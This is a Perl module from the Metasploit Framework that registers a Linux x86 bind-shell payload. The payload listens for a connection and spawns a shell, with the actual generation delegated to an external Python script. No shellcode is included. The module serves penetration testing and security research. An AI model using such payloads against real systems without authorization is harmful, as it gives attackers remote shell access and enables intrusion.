
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors fields below. In the
# case of an Unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::linx86_bind_ie;
use strict;
use base 'Msf::PayloadComponent::ExternalPayload';
sub load {
  Msf::PayloadComponent::ExternalPayload->import('Msf::PayloadComponent::BindConnection');
}

my $info =
{
  'Name'         => 'linx86bind_ie',
  'Version'      => '$Revision$',
  'Description'  => 'Listen for connection and spawn a shell',
  'Authors'      => [ 'gera[at]corest.com [InlineEgg License]', ],
  'Arch'         => [ 'x86' ],
  'Priv'         => 0,
  'OS'           => [ 'linux' ],
  'Size'         => 0,
};

sub new {
  load();
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHash($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);

  $self->{'Filename'} = $self->ScriptBase . '/payloads/external/linx86bind_ie.py';
  $self->_Info->{'Size'} = $self->_GenSize;
  return($self);
}

sub _GenSize {
  my $self = shift;
  my $bin = $self->Generate({'LPORT' => '4444',});
  return(length($bin));
}

1;
